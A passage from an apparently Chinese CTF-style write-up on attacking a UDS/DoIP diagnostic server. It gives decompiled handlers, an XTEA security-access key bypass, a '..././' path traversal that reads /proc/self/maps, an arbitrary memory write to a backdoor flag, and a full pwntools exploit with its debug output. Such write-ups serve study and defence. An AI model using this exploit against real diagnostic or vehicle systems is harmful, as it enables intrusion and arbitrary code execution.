  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  bVar2 = puVar6[5];
  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  bVar3 = puVar6[6];
  puVar6 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(data);
  v1 = (uint)puVar6[7] * 0x1000000 + (uint)bVar1 + (uint)bVar2 * 0x100 + (uint)bVar3 * 0x10000;
  delta = 0x9e3779b9;
  n = 0x20;
  sum = 0;
  for (i = 0; i < 0x20; i = i + 1) {
    v0 = v0 + (sum + k[sum & 3] ^ (v1 << 4 ^ v1 >> 5) + v1);
    sum = sum + 0x9e3779b9;
    v1 = v1 + (sum + k[sum >> 0xb & 3] ^ (v0 * 0x10 ^ v0 >> 5) + v0);
  }
  key = v0 ^ v1;
  for (i_1 = 0; i_1 < 4; i_1 = i_1 + 1) {
    local_59 = (value_type)key;
    std::vector<unsigned_char,_std::allocator<unsigned_char>_>::push_back(outputData,&local_59);
    key = key >> 8;
  }
  if (lVar4 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

从该函数中可以得到加密算法为XTEA，加密key为`[0x1234567, 0x89abcdef, 0xdeadbeef, 0xbeefdead]`，加密结果v0和v1进行异或后存到outputData中返回。

通过对UdsSecurityAccessService的分析，把securityLevel赋值为1有两个步骤：

- 初始化seed，可从response得到随机的seed
- 通过xtea算法把加密过后的结果计算出来，作为key传入服务端即可



除了securityLevel和currentSession，还剩下以下条件：

- routineControlType=='\x01'

- routineIdentifier==0xbac4
- *backdoorMem==0xdeadbeef

前两个在进行UdsRoutineControlService时可以Doip的data来进行指定，那么只剩下backdoorMem

继续看其他UDS诊断服务提供了哪些功能



UdsRequestFileTransferService服务如下所示：

```c++

DoipMessage * __thiscall
UdsRequestFileTransferService::handleMessage
          (UdsRequestFileTransferService *this,DoipDiagnosticRequstMessage *message)

{
  long lVar1;
  bool bVar2;
  UdsNegativeResponseMessage *pUVar3;
  ulong uVar4;
  long lVar5;
  char *__file;
  undefined8 uVar6;
  __off_t _Var7;
  UdsRequestFileTransferPositiveMessage *this_00;
  ulong uVar8;
  UdsNegativeResponseMessage *unaff_R12;
  long in_FS_OFFSET;
  allocator<char> local_21d1;
  int i;
  int fd;
  DoipMessage *respMsg;
  char *cstr;
  string newPath;
  UdsRequestFileTransferMessage msg;
  char filepath [256];
  char buf [4096];
  char dataBuf [4096];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  respMsg = (DoipMessage *)0x0;
  UdsRequestFileTransferMessage::UdsRequestFileTransferMessage(&msg,message);
                    /* try { // try from 001097c3 to 00109871 has its CatchHandler @ 00109c53 */
  bVar2 = UdsRequestFileTransferMessage::parseMessage(&msg);
  if (bVar2 == true) {
    if (((((this->super_UdsService).server)->securityLevel == 1) &&
        (((this->super_UdsService).server)->currentSession == 2)) &&
       (((this->super_UdsService).server)->fileFd < 0)) {
      if (msg.modeOfOperation == '\x04') {
        memset(buf,0,0x1000);
        memset(dataBuf,0,0x1000);
        memset(filepath,0,0x100);
        std::allocator<char>::allocator();
                    /* try { // try from 00109905 to 00109909 has its CatchHandler @ 00109c0a */
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
                  ((char *)&newPath,(allocator *)"/tmp/data/");
        std::allocator<char>::~allocator(&local_21d1);
        cstr = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>
                       ::c_str();
        i = 0;
        while( true ) {
          uVar8 = (ulong)i;
          uVar4 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::size
                            ();
          if (uVar4 <= uVar8) break;
          uVar4 = (ulong)i;
          lVar5 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::size
                            ();
          if (((uVar4 < lVar5 - 3U) && (cstr[i] == '.')) &&
             ((cstr[(long)i + 1] == '.' && (cstr[(long)i + 2] == '/')))) {
            bVar2 = true;
          }
          else {
            bVar2 = false;
          }
          if (bVar2) {
            i = i + 3;
          }
          else {
            if (cstr[i] == '\0') break;
                    /* try { // try from 00109a3b to 00109ba4 has its CatchHandler @ 00109c3b */
            std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=
                      ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&newPath,
                       cstr[i]);
            i = i + 1;
          }
        }
        __file = (char *)std::__cxx11::
                         basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str();
        fd = open(__file,0);
        if (fd < 0) {
          uVar6 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::
                  c_str();
          fprintf(stderr,"open %s failed\n",uVar6);
          unaff_R12 = (UdsNegativeResponseMessage *)operator.new(0x50);
          UdsNegativeResponseMessage::UdsNegativeResponseMessage(unaff_R12,'8','\x10');
          bVar2 = false;
          respMsg = (DoipMessage *)unaff_R12;
        }
        else {
          ((this->super_UdsService).server)->fileFd = fd;
          _Var7 = lseek(fd,0,2);
          ((this->super_UdsService).server)->fileSize = (uint)_Var7;
          ((this->super_UdsService).server)->curFileIdx = 1;
          ((this->super_UdsService).server)->maxFileIdx =
               ((this->super_UdsService).server)->fileSize >> 0xb;
          if ((((this->super_UdsService).server)->fileSize & 0x7ff) != 0) {
            ((this->super_UdsService).server)->maxFileIdx =
                 ((this->super_UdsService).server)->maxFileIdx + 1;
          }
          lseek(fd,0,0);
          this_00 = (UdsRequestFileTransferPositiveMessage *)operator.new(0xa0);
                    /* try { // try from 00109bbb to 00109bbf has its CatchHandler @ 00109c22 */
          UdsRequestFileTransferPositiveMessage::UdsRequestFileTransferPositiveMessage
                    (this_00,((this->super_UdsService).server)->fileSize);
          bVar2 = true;
          respMsg = (DoipMessage *)this_00;
        }
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&newPath);
        if (!bVar2) goto LAB_00109be7;
      }
      else {
        pUVar3 = (UdsNegativeResponseMessage *)operator.new(0x50);
        UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar3,'8','\x12');
        respMsg = (DoipMessage *)pUVar3;
      }
    }
    else {
      pUVar3 = (UdsNegativeResponseMessage *)operator.new(0x50);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar3,'8','\"');
      respMsg = (DoipMessage *)pUVar3;
    }
  }
  else {
    pUVar3 = (UdsNegativeResponseMessage *)operator.new(0x50);
    UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar3,'8','\x13');
    respMsg = (DoipMessage *)pUVar3;
  }
  unaff_R12 = (UdsNegativeResponseMessage *)respMsg;
LAB_00109be7:
  UdsRequestFileTransferMessage::~UdsRequestFileTransferMessage(&msg);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (DoipMessage *)unaff_R12;
}
```

可知该服务可以传入一个路径，拼接到"/tmp/data/"的后面，然后调用open函数打开该路径的文件，并将文件描述符赋值到fileFd中。不过传入的路径经过了一次过滤，过滤了“../”。因为只过滤了一次，故双写“../”即可绕过该限制。



UdsTransferDataService服务会从fileFd中读取0x800字节，内容通过response进行返回。

```c++

DoipMessage * __thiscall
UdsTransferDataService::handleMessage
          (UdsTransferDataService *this,DoipDiagnosticRequstMessage *message)

{
  long lVar1;
  DoipMessage *pDVar2;
  bool bVar3;
  UdsNegativeResponseMessage *pUVar4;
  ssize_t sVar5;
  UdsTransferDataPositiveMessage *this_00;
  long in_FS_OFFSET;
  int readSize;
  iterator local_8b0;
  const_iterator local_8a8;
  DoipMessage *respMsg;
  vector<unsigned_char,_std::allocator<unsigned_char>_> tmpData;
  UdsTransferDataMessage msg;
  uchar data [2048];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  respMsg = (DoipMessage *)0x0;
  UdsTransferDataMessage::UdsTransferDataMessage(&msg,message);
                    /* try { // try from 00109ce3 to 00109e6b has its CatchHandler @ 00109fc4 */
  bVar3 = UdsTransferDataMessage::parseMessage(&msg);
  if (bVar3 == true) {
    if (((((this->super_UdsService).server)->securityLevel == 1) &&
        (((this->super_UdsService).server)->currentSession == 2)) &&
       (-1 < ((this->super_UdsService).server)->fileFd)) {
      if (((this->super_UdsService).server)->maxFileIdx <
          ((this->super_UdsService).server)->curFileIdx) {
        pUVar4 = (UdsNegativeResponseMessage *)operator.new(0x50);
        UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar4,'6','q');
        respMsg = (DoipMessage *)pUVar4;
      }
      else if (((this->super_UdsService).server)->curFileIdx == (uint)msg.blockSequenceCounter) {
        memset(data,0,0x800);
        sVar5 = read(((this->super_UdsService).server)->fileFd,data,0x800);
        if ((int)sVar5 < 1) {
          pUVar4 = (UdsNegativeResponseMessage *)operator.new(0x50);
          UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar4,'6','\x10');
          respMsg = (DoipMessage *)pUVar4;
        }
        else {
          std::vector<unsigned_char,_std::allocator<unsigned_char>_>::vector(&tmpData);
          local_8b0 = (uchar *)std::vector<unsigned_char,_std::allocator<unsigned_char>_>::end
                                         (&tmpData);
          __gnu_cxx::
          __normal_iterator<unsigned_char_const*,_std::vector<unsigned_char,_std::allocator<unsigned _char>_>_>
          ::__normal_iterator<unsigned_char*>(&local_8a8,&local_8b0);
                    /* try { // try from 00109f00 to 00109f0e has its CatchHandler @ 00109fac */
          std::vector<unsigned_char,_std::allocator<unsigned_char>_>::insert<unsigned_char*>
                    (&tmpData,(const_iterator)local_8a8,data,data + (int)sVar5);
          this_00 = (UdsTransferDataPositiveMessage *)operator.new(0x68);
                    /* try { // try from 00109f2f to 00109f33 has its CatchHandler @ 00109f93 */
          UdsTransferDataPositiveMessage::UdsTransferDataPositiveMessage
                    (this_00,(uchar)((this->super_UdsService).server)->curFileIdx,&tmpData);
          ((this->super_UdsService).server)->curFileIdx =
               ((this->super_UdsService).server)->curFileIdx + 1;
          respMsg = (DoipMessage *)this_00;
          std::vector<unsigned_char,_std::allocator<unsigned_char>_>::~vector(&tmpData);
        }
      }
      else {
        pUVar4 = (UdsNegativeResponseMessage *)operator.new(0x50);
        UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar4,'6','1');
        respMsg = (DoipMessage *)pUVar4;
      }
    }
    else {
      pUVar4 = (UdsNegativeResponseMessage *)operator.new(0x50);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar4,'6','\"');
      respMsg = (DoipMessage *)pUVar4;
    }
  }
  else {
    pUVar4 = (UdsNegativeResponseMessage *)operator.new(0x50);
    UdsNegativeResponseMessage::UdsNegativeResponseMessage(pUVar4,'6','\x13');
    respMsg = (DoipMessage *)pUVar4;
  }
  pDVar2 = respMsg;
  UdsTransferDataMessage::~UdsTransferDataMessage(&msg);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return pDVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```



结合UdsRequestFileTransferService和UdsTransferDataService两个服务即可进行任意文件读取。

UdsWriteMemoryByAddressService服务提供了修改内存的操作，其实地址是progMem(0x123000)，能够控制的是index

```c++

DoipMessage * __thiscall
UdsWriteMemoryByAddressService::handleMessage
          (UdsWriteMemoryByAddressService *this,DoipDiagnosticRequstMessage *message)

{
  long lVar1;
  bool bVar2;
  UdsWriteMemoryByAddressPositiveMessage *this_00;
  size_type sVar3;
  uchar *__src;
  long in_FS_OFFSET;
  DoipMessage *respMsg;
  UdsWriteMemoryByAddressMessage msg;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  UdsWriteMemoryByAddressMessage::UdsWriteMemoryByAddressMessage(&msg,message);
                    /* try { // try from 0010a28d to 0010a37e has its CatchHandler @ 0010a3b9 */
  bVar2 = UdsWriteMemoryByAddressMessage::parseMessage(&msg);
  if (bVar2 == true) {
    if ((((this->super_UdsService).server)->securityLevel == 1) &&
       (((this->super_UdsService).server)->currentSession == 2)) {
      sVar3 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size(&msg.dataRecord);
      __src = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::data(&msg.dataRecord);
      memcpy(((this->super_UdsService).server)->progMem + msg.memoryAddress,__src,sVar3);
      sVar3 = std::vector<unsigned_char,_std::allocator<unsigned_char>_>::size(&msg.dataRecord);
      this_00 = (UdsWriteMemoryByAddressPositiveMessage *)operator.new(0x58);
      UdsWriteMemoryByAddressPositiveMessage::UdsWriteMemoryByAddressPositiveMessage
                (this_00,(uchar)sVar3,msg.memoryAddress);
    }
    else {
      this_00 = (UdsWriteMemoryByAddressPositiveMessage *)operator.new(0x50);
      UdsNegativeResponseMessage::UdsNegativeResponseMessage
                ((UdsNegativeResponseMessage *)this_00,'=','\"');
    }
  }
  else {
    this_00 = (UdsWriteMemoryByAddressPositiveMessage *)operator.new(0x50);
    UdsNegativeResponseMessage::UdsNegativeResponseMessage
              ((UdsNegativeResponseMessage *)this_00,'=','\x13');
  }
  UdsWriteMemoryByAddressMessage::~UdsWriteMemoryByAddressMessage(&msg);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (DoipMessage *)this_00;
}
```



想要修改backdoorMem的内容为0xdeadbeef，就需要知道backdoorMem的地址，计算出来backdoorMem与progMem的偏移，然后再使用UdsWriteMemoryByAddressService的功能，修改即可。



目前有任意文件读取的能力，想要泄露进行内存地址，不难想到“/proc/self/maps”。结合UdsRequestFileTransferService和UdsTransferDataService两个服务读取“/proc/self/maps”，泄露出backdoorMem的地址，进而修改backdoorMem的内容为0xdeadbeef。





## 攻击思路

至此，整个程序已经分析结束，目的就是为了获取flag，攻击思路如下所示：

1. 调用handleRoutingActivationMessage函数将hasRegisterd置为True
2. 调用两次UdsSessionControlService函数将currentSession置为2
3. 调用两次SecurityAccess将securityLevel置为1
4. 调用UdsRequestFileTransferService设置文件路径并打开，传入路径为“..././..././proc/self/maps”
5. 调用UdsTransferDataService来读取文件，泄露出来backdoorMem的地址
6. 调用UdsWriteMemoryByAddressService写backdoorMem的内容为0xdeadbeef
7. 调用UdsRoutineControlService来执行“/getflag”



## 攻击脚本

```python
#coding:utf-8
from pwn import *
from ctypes import * 
context.log_level='debug'
r = remote("127.0.0.1",13400)
sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()


# def doip_msg(dataType,len,data):
#     version = 0x2
#     sourceAddress = "\x00\x01"
#     targetAddress = "\x01\x00"
#     return p8(version)+p8(version^0xff)+dataType+len+sourceAddress+targetAddress+data



# sd(doip_msg("\x80\x01","\x00\x00\x00\x04",""))

def RoutingActivation():
    payload = "\x02\xfd"
    payload += "\x00\x05"#dataType
    payload += "\x00\x00\x00\x07"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x00"#activationType
    payload += "\xaa\xaa\xaa\xaa"#reservedIso
    sd(payload)


def setfilepath():
    payload = "\x02\xfd"
    payload += "\x80\x01"#dataType
    #data
    payload += "\x00\x00\x00\x23"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x01\x00"#targetAddress
    
    payload += "\x38"#UDS_choose
    payload += "\x04"#modeOfOperation
    payload += "\x00\x1a"#filePathAndNameLength
    payload += "..././..././proc/self/maps"#0x1a
    payload += "\xAA"
    sd(payload)

def WriteMemoryByAddress(target_addr):
    payload = "\x02\xfd"
    payload += "\x80\x01"#dataType
    #data
    payload += "\x00\x00\x00\x0f"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x01\x00"#targetAddress
    
    memorySizeLen = 1
    memoryAddressLen = 4
    memorySize=4
    payload += "\x3d"#UDS_choose
    payload += chr(memorySizeLen<<4^memoryAddressLen)
    payload += target_addr#memoryAddress
    payload += chr(memorySize)
    payload += p32(0xDEADBEEF)
    sd(payload)


def TransferData():
    payload = "\x02\xfd"
    payload += "\x80\x01"#dataType
    #data
    payload += "\x00\x00\x00\x06"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x01\x00"#targetAddress
    
    payload += "\x36"#UDS_choose
    payload += "\x01"#blockSequenceCounter

    sd(payload)


def SessionControl(Session):
    payload = "\x02\xfd"
    payload += "\x80\x01"#dataType
    #data
    payload += "\x00\x00\x00\x06"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x01\x00"#targetAddress
    
    payload += "\x10"#UDS_choose
    payload += chr(Session)#diagnosticSessionType
    sd(payload)

def SecurityAccess(ch,key):
    payload = "\x02\xfd"
    payload += "\x80\x01"#dataType
    #data
    payload += "\x00\x00\x00\x0a"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x01\x00"#targetAddress
    
    payload += "\x27"#UDS_choose
    payload += chr(ch)#securityAccessType
    payload += key

    sd(payload)

def encrypt(v, key):   
    v0, v1 = c_uint32(v[0]), c_uint32(v[1])
    delta = 0x9E3779B9

    total = c_uint32(0)
    for i in range(32):  
        v0.value += (((v1.value << 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value & 3])
        total.value += delta 
        v1.value += (((v0.value << 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value>>11) & 3])

    return v0.value ^ v1.value 

def enc_seed(seed):
    #seed转换加密前数据
    data = ""
    for i in range(8):
        data+= chr(ord(seed[i%4])+i)
    v0 = u32(data[:4])
    v1 = u32(data[4:])
    value = [v0, v1]
    key = [0x1234567, 0x89abcdef, 0xdeadbeef, 0xbeefdead]
    res = encrypt(value, key)
    print("Encrypted data is : ", hex(res))
    return res


def getflag():
    payload = "\x02\xfd"
    payload += "\x80\x01"#dataType
    #data
    payload += "\x00\x00\x00\x08"#len
    payload += "\x00\x01"#sourceAddress
    payload += "\x01\x00"#targetAddress
    
    payload += "\x31"#UDS_choose
    payload += "\x01"#routineControlType
    payload += "\xba\xc4"#routineIdentifier


    sd(payload)


if __name__ == "__main__":
    RoutingActivation()
    r.recv()
    SessionControl(3)
    r.recv()
    SessionControl(2)
    r.recv()
    SecurityAccess(1,"\xaa"*4)#init seed
    r.recv(0xe)
    seed = r.recv(4)
    li("seed",u32(seed))
    key = enc_seed(seed)
    SecurityAccess(2,p32(key))#xtea seed
    r.recv()
    setfilepath()# setfilepath()
    r.recv()
    TransferData()# leak memery
    ru("00123000-00124000 -wxp 00000000 00:00 0 \n")
    backdoorMem = eval("0x"+rud("-"))
    # print "0x"+rud("-")
    li("backdoorMem",backdoorMem)
    target = backdoorMem - 0x123000
    r.recv()
    WriteMemoryByAddress(p32(target)[::-1])
    r.recv()
    getflag()
    ri()


'''
0x66f25f9  
0x7fffffffded0
f2 e2 ba 03
0xf2	0xe3	0xbc	0x06	0xf6	0xe7	0xc0	0x0a

0xe0	0x90	0xe7	0x7f	0xbe	0x55	0x00	0x00
'''
```



## 攻击效果

提前在服务机器上创建“/tmp/data/”文件夹，以及"/getflag"文件，内容如下所示：

```bash
➜  ~ cat /getflag
#!/bin/bash
echo "flag{this_is_test}"
```

运行攻击脚本：

```bash
T0Night ➜ python uds_exp.py
[+] Opening connection to 127.0.0.1 on port 13400: Done
[DEBUG] Sent 0xf bytes:
    00000000  02 fd 00 05  00 00 00 07  00 01 00 aa  aa aa aa     │····│····│····│···│
    0000000f
[DEBUG] Received 0x15 bytes:
    00000000  02 fd 00 06  00 00 00 0d  00 01 01 00  10 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00                                     │····│·│
    00000015
[DEBUG] Sent 0xe bytes:
    00000000  02 fd 80 01  00 00 00 06  00 01 01 00  10 03        │····│····│····│··│
    0000000e
[DEBUG] Received 0xe bytes:
    00000000  02 fd 80 01  00 00 00 06  01 00 00 01  50 03        │····│····│····│P·│
    0000000e
[DEBUG] Sent 0xe bytes:
    00000000  02 fd 80 01  00 00 00 06  00 01 01 00  10 02        │····│····│····│··│
    0000000e
[DEBUG] Received 0xe bytes:
    00000000  02 fd 80 01  00 00 00 06  01 00 00 01  50 02        │····│····│····│P·│
    0000000e
[DEBUG] Sent 0x12 bytes:
    00000000  02 fd 80 01  00 00 00 0a  00 01 01 00  27 01 aa aa  │····│····│····│'···│
    00000010  aa aa                                               │··│
    00000012
[DEBUG] Received 0x12 bytes:
    00000000  02 fd 80 01  00 00 00 0a  01 00 00 01  67 01 96 28  │····│····│····│g··(│
    00000010  16 2c                                               │·,│
    00000012
[*] seed:0x2c162896
('Encrypted data is : ', '0x84d2325c')
[DEBUG] Sent 0x12 bytes:
    00000000  02 fd 80 01  00 00 00 0a  00 01 01 00  27 02 5c 32  │····│····│····│'·\2│
    00000010  d2 84                                               │··│
    00000012
[DEBUG] Received 0xe bytes:
    00000000  02 fd 80 01  00 00 00 06  01 00 00 01  67 02        │····│····│····│g·│
    0000000e
[DEBUG] Sent 0x2b bytes:
    00000000  02 fd 80 01  00 00 00 23  00 01 01 00  38 04 00 1a  │····│···#│····│8···│
    00000010  2e 2e 2e 2f  2e 2f 2e 2e  2e 2f 2e 2f  70 72 6f 63  │.../│./..│././│proc│
    00000020  2f 73 65 6c  66 2f 6d 61  70 73 aa                  │/sel│f/ma│ps·│
    0000002b
[DEBUG] Received 0x1e bytes:
    00000000  02 fd 80 01  00 00 00 16  01 00 00 01  78 04 04 00  │····│····│····│x···│
    00000010  00 08 00 00  00 04 ff ff  ff ff ff ff  ff ff        │····│····│····│··│
    0000001e
[DEBUG] Sent 0xe bytes:
    00000000  02 fd 80 01  00 00 00 06  00 01 01 00  36 01        │····│····│····│6·│
    0000000e
[DEBUG] Received 0x80e bytes:
    00000000  02 fd 80 01  00 00 08 06  01 00 00 01  76 01 30 30  │····│····│····│v·00│
    00000010  31 32 33 30  30 30 2d 30  30 31 32 34  30 30 30 20  │1230│00-0│0124│000 │
    00000020  2d 77 78 70  20 30 30 30  30 30 30 30  30 20 30 30  │-wxp│ 000│0000│0 00│
    00000030  3a 30 30 20  30 20 0a 30  38 39 39 39  30 30 30 2d  │:00 │0 ·0│8999│000-│
    00000040  30 38 39 39  61 30 30 30  20 2d 77 78  70 20 30 30  │0899│a000│ -wx│p 00│
    00000050  30 30 30 30  30 30 20 30  30 3a 30 30  20 30 20 0a  │0000│00 0│0:00│ 0 ·│
    00000060  35 35 63 31  37 32 33 62  30 30 30 30  2d 35 35 63  │55c1│723b│0000│-55c│
    00000070  31 37 32 33  62 33 30 30  30 20 72 2d  2d 70 20 30  │1723│b300│0 r-│-p 0│
    00000080  30 30 30 30  30 30 30 20  30 38 3a 30  35 20 31 38  │0000│000 │08:0│5 18│
    00000090  34 31 32 38  36 20 20 20  20 20 20 20  20 20 20 20  │4128│6   │    │    │
    000000a0  20 20 20 20  20 20 20 20  20 2f 72 6f  6f 74 2f 75  │    │    │ /ro│ot/u│
    000000b0  64 73 5f 73  65 72 76 65  72 0a 35 35  63 31 37 32  │ds_s│erve│r·55│c172│
    000000c0  33 62 33 30  30 30 2d 35  35 63 31 37  32 33 62 64  │3b30│00-5│5c17│23bd│
    000000d0  30 30 30 20  72 2d 78 70  20 30 30 30  30 33 30 30  │000 │r-xp│ 000│0300│
    000000e0  30 20 30 38  3a 30 35 20  31 38 34 31  32 38 36 20  │0 08│:05 │1841│286 │
    000000f0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000100  20 20 20 2f  72 6f 6f 74  2f 75 64 73  5f 73 65 72  │   /│root│/uds│_ser│
    00000110  76 65 72 0a  35 35 63 31  37 32 33 62  64 30 30 30  │ver·│55c1│723b│d000│
    00000120  2d 35 35 63  31 37 32 33  63 31 30 30  30 20 72 2d  │-55c│1723│c100│0 r-│
    00000130  2d 70 20 30  30 30 30 64  30 30 30 20  30 38 3a 30  │-p 0│000d│000 │08:0│
    00000140  35 20 31 38  34 31 32 38  36 20 20 20  20 20 20 20  │5 18│4128│6   │    │
    00000150  20 20 20 20  20 20 20 20  20 20 20 20  20 2f 72 6f  │    │    │    │ /ro│
    00000160  6f 74 2f 75  64 73 5f 73  65 72 76 65  72 0a 35 35  │ot/u│ds_s│erve│r·55│
    00000170  63 31 37 32  33 63 31 30  30 30 2d 35  35 63 31 37  │c172│3c10│00-5│5c17│
    00000180  32 33 63 32  30 30 30 20  72 2d 2d 70  20 30 30 30  │23c2│000 │r--p│ 000│
    00000190  31 30 30 30  30 20 30 38  3a 30 35 20  31 38 34 31  │1000│0 08│:05 │1841│
    000001a0  32 38 36 20  20 20 20 20  20 20 20 20  20 20 20 20  │286 │    │    │    │
    000001b0  20 20 20 20  20 20 20 2f  72 6f 6f 74  2f 75 64 73  │    │   /│root│/uds│
    000001c0  5f 73 65 72  76 65 72 0a  35 35 63 31  37 32 33 63  │_ser│ver·│55c1│723c│
    000001d0  32 30 30 30  2d 35 35 63  31 37 32 33  63 33 30 30  │2000│-55c│1723│c300│
    000001e0  30 20 72 77  2d 70 20 30  30 30 31 31  30 30 30 20  │0 rw│-p 0│0011│000 │
    000001f0  30 38 3a 30  35 20 31 38  34 31 32 38  36 20 20 20  │08:0│5 18│4128│6   │
    00000200  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000210  20 2f 72 6f  6f 74 2f 75  64 73 5f 73  65 72 76 65  │ /ro│ot/u│ds_s│erve│
    00000220  72 0a 35 35  63 31 37 33  64 31 38 30  30 30 2d 35  │r·55│c173│d180│00-5│
    00000230  35 63 31 37  33 64 33 39  30 30 30 20  72 77 2d 70  │5c17│3d39│000 │rw-p│
    00000240  20 30 30 30  30 30 30 30  30 20 30 30  3a 30 30 20  │ 000│0000│0 00│:00 │
    00000250  30 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │0   │    │    │    │
    00000260  20 20 20 20  20 20 20 20  20 20 20 5b  68 65 61 70  │    │    │   [│heap│
    00000270  5d 0a 37 66  36 37 62 64  66 36 34 30  30 30 2d 37  │]·7f│67bd│f640│00-7│
    00000280  66 36 37 62  64 66 36 38  30 30 30 20  72 77 2d 70  │f67b│df68│000 │rw-p│
    00000290  20 30 30 30  30 30 30 30  30 20 30 30  3a 30 30 20  │ 000│0000│0 00│:00 │
    000002a0  30 20 0a 37  66 36 37 62  64 66 36 38  30 30 30 2d  │0 ·7│f67b│df68│000-│
    000002b0  37 66 36 37  62 64 66 37  35 30 30 30  20 72 2d 2d  │7f67│bdf7│5000│ r--│
    000002c0  70 20 30 30  30 30 30 30  30 30 20 30  38 3a 30 35  │p 00│0000│00 0│8:05│
    000002d0  20 32 34 39  32 35 36 38  20 20 20 20  20 20 20 20  │ 249│2568│    │    │
    000002e0  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    000002f0  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    00000300  78 2d 67 6e  75 2f 6c 69  62 6d 2d 32  2e 33 31 2e  │x-gn│u/li│bm-2│.31.│
    00000310  73 6f 0a 37  66 36 37 62  64 66 37 35  30 30 30 2d  │so·7│f67b│df75│000-│
    00000320  37 66 36 37  62 65 30 31  63 30 30 30  20 72 2d 78  │7f67│be01│c000│ r-x│
    00000330  70 20 30 30  30 30 64 30  30 30 20 30  38 3a 30 35  │p 00│00d0│00 0│8:05│
    00000340  20 32 34 39  32 35 36 38  20 20 20 20  20 20 20 20  │ 249│2568│    │    │
    00000350  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    00000360  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    00000370  78 2d 67 6e  75 2f 6c 69  62 6d 2d 32  2e 33 31 2e  │x-gn│u/li│bm-2│.31.│
    00000380  73 6f 0a 37  66 36 37 62  65 30 31 63  30 30 30 2d  │so·7│f67b│e01c│000-│
    00000390  37 66 36 37  62 65 30 62  35 30 30 30  20 72 2d 2d  │7f67│be0b│5000│ r--│
    000003a0  70 20 30 30  30 62 34 30  30 30 20 30  38 3a 30 35  │p 00│0b40│00 0│8:05│
    000003b0  20 32 34 39  32 35 36 38  20 20 20 20  20 20 20 20  │ 249│2568│    │    │
    000003c0  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    000003d0  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    000003e0  78 2d 67 6e  75 2f 6c 69  62 6d 2d 32  2e 33 31 2e  │x-gn│u/li│bm-2│.31.│
    000003f0  73 6f 0a 37  66 36 37 62  65 30 62 35  30 30 30 2d  │so·7│f67b│e0b5│000-│
    00000400  37 66 36 37  62 65 30 62  36 30 30 30  20 72 2d 2d  │7f67│be0b│6000│ r--│
    00000410  70 20 30 30  31 34 63 30  30 30 20 30  38 3a 30 35  │p 00│14c0│00 0│8:05│
    00000420  20 32 34 39  32 35 36 38  20 20 20 20  20 20 20 20  │ 249│2568│    │    │
    00000430  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    00000440  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    00000450  78 2d 67 6e  75 2f 6c 69  62 6d 2d 32  2e 33 31 2e  │x-gn│u/li│bm-2│.31.│
    00000460  73 6f 0a 37  66 36 37 62  65 30 62 36  30 30 30 2d  │so·7│f67b│e0b6│000-│
